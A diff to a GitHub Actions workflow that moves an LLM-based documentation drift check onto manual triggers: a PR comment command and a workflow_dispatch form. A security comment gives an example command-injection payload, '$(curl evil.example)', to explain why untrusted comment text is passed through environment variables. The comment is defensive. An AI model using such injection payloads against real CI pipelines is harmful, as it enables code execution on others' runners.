@@ -1,22 +1,43 @@
 name: Doc Drift (on-demand)
 
 # Layer 3 (advisory, LLM-based semantic drift check) — moved off the automatic per-push
-# trigger (see docs/spec-drift.md §6 + CLAUDE-decisions.md) onto a PR-comment chatops
-# trigger instead. Rationale: the old `if: github.event_name == 'pull_request'` gate fired
-# on every commit pushed to an open PR, and the path-filter compared the FULL diff since the
-# base branch — so once a PR touched a mapped path once, every subsequent push re-ran the
-# LLM call again (not incremental/cached), which could add up across a PR with many pushes.
-# This version only runs when someone explicitly asks for it.
+# trigger (see docs/spec-drift.md §6 + CLAUDE-decisions.md) onto two manual triggers instead.
+# Rationale: the old `if: github.event_name == 'pull_request'` gate fired on every commit
+# pushed to an open PR, and the path-filter compared the FULL diff since the base branch —
+# so once a PR touched a mapped path once, every subsequent push re-ran the LLM call again
+# (not incremental/cached), which could add up across a PR with many pushes. This version
+# only runs when someone explicitly asks for it, two ways:
 #
-# Usage: comment on a PR with `/check-doc-drift` (all four docs) or
-# `/check-doc-drift <doc>` where <doc> is one of: authentication, claude,
-# analysis-pipeline, dashboard-output-formats.
+# 1. Comment on a PR: `/check-doc-drift` (all four docs) or `/check-doc-drift <doc>` where
+#    <doc> is one of: authentication, claude, analysis-pipeline, dashboard-output-formats.
+# 2. Actions tab → "Doc Drift (on-demand)" → "Run workflow" → pick a PR number + doc from the
+#    dropdown. Requires write access to the repo (same as any workflow_dispatch), so no
+#    separate author check is needed on this path — the comment path still gates on
+#    author_association since anyone can comment on a PR.
 on:
   issue_comment:
     types: [created]
+  workflow_dispatch:
+    inputs:
+      pr_number:
+        description: 'PR number to check'
+        required: true
+        type: number
+      doc:
+        description: 'Which doc to check'
+        required: false
+        type: choice
+        default: all
+        options:
+          - all
+          - authentication
+          - claude
+          - analysis-pipeline
+          - dashboard-output-formats
 
 permissions:
   pull-requests: write
+  issues: write
 
 env:
   DOC_DRIFT_MODEL: claude-sonnet-5
@@ -26,9 +47,10 @@ jobs:
   # depends on this one and reads its `doc` output to decide whether it should run.
   dispatch:
     if: >-
-      github.event.issue.pull_request != null &&
-      startsWith(github.event.comment.body, '/check-doc-drift') &&
-      contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.comment.author_association)
+      github.event_name == 'workflow_dispatch' ||
+      (github.event.issue.pull_request != null &&
+       startsWith(github.event.comment.body, '/check-doc-drift') &&
+       contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.comment.author_association))
     runs-on: ubuntu-latest
     env:
       GH_TOKEN: ${{ github.token }}
@@ -38,27 +60,37 @@ jobs:
       pr_number: ${{ steps.parse.outputs.pr_number }}
       pr_ref: ${{ steps.pr.outputs.ref }}
     steps:
-      # SECURITY: the comment body is untrusted, attacker-controllable text. It MUST be
-      # passed through an env var (never spliced directly via ${{ }} into a `run:` script) —
-      # otherwise a crafted comment like `$(curl evil.example)` would execute inside the
-      # runner. Passing it as $COMMENT_BODY and only ever using it inside quoted expansions
-      # (never eval'd) keeps this safe.
-      - name: Parse requested doc from comment
+      # SECURITY: the comment body (and, on the workflow_dispatch path, the free-text inputs)
+      # is untrusted, attacker-controllable text. It MUST be passed through an env var (never
+      # spliced directly via ${{ }} into a `run:` script) — otherwise a crafted comment like
+      # `$(curl evil.example)` would execute inside the runner. Passing it as $COMMENT_BODY
+      # and only ever using it inside quoted expansions (never eval'd) keeps this safe.
+      - name: Parse requested doc + PR number
         id: parse
         env:
           COMMENT_BODY: ${{ github.event.comment.body }}
+          DISPATCH_DOC: ${{ github.event.inputs.doc }}
+          DISPATCH_PR: ${{ github.event.inputs.pr_number }}
         run: |
-          ARG=$(printf '%s\n' "$COMMENT_BODY" | head -n1 | sed -E 's#^/check-doc-drift[[:space:]]*##' | awk '{print $1}' | tr '[:upper:]' '[:lower:]')
-          case "$ARG" in
-            ""|all) DOC="all" ;;
-            authentication) DOC="authentication" ;;
-            claude|claude.md) DOC="claude" ;;
-            analysis-pipeline) DOC="analysis-pipeline" ;;
-            dashboard-output-formats) DOC="dashboard-output-formats" ;;
-            *) DOC="invalid" ;;
-          esac
+          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
+            # workflow_dispatch's `doc` is a fixed dropdown (type: choice) — always one of the
+            # known values, no validation needed. `pr_number` is a plain number input.
+            DOC="${DISPATCH_DOC:-all}"
+            PR_NUMBER="$DISPATCH_PR"
+          else
+            ARG=$(printf '%s\n' "$COMMENT_BODY" | head -n1 | sed -E 's#^/check-doc-drift[[:space:]]*##' | awk '{print $1}' | tr '[:upper:]' '[:lower:]')
+            case "$ARG" in
+              ""|all) DOC="all" ;;
+              authentication) DOC="authentication" ;;
+              claude|claude.md) DOC="claude" ;;
+              analysis-pipeline) DOC="analysis-pipeline" ;;
+              dashboard-output-formats) DOC="dashboard-output-formats" ;;
+              *) DOC="invalid" ;;
+            esac
+            PR_NUMBER="${{ github.event.issue.number }}"
+          fi
           echo "doc=$DOC" >> "$GITHUB_OUTPUT"
-          echo "pr_number=${{ github.event.issue.number }}" >> "$GITHUB_OUTPUT"
+          echo "pr_number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
 
       - name: Resolve PR head ref
         id: pr
@@ -67,11 +99,12 @@ jobs:
           echo "ref=$REF" >> "$GITHUB_OUTPUT"
 
       - name: Acknowledge the request (👀 reaction on the comment)
+        if: github.event_name == 'issue_comment'
         run: |
           gh api "repos/${{ github.repository }}/issues/comments/${{ github.event.comment.id }}/reactions" -f content='eyes' > /dev/null
 
       - name: Reply with usage if the doc argument wasn't recognized
-        if: steps.parse.outputs.doc == 'invalid'
+        if: github.event_name == 'issue_comment' && steps.parse.outputs.doc == 'invalid'
         run: |
           gh pr comment "${{ steps.parse.outputs.pr_number }}" --body "$(cat <<'EOF'
           ⚠️ Unrecognized `/check-doc-drift` argument. Usage:
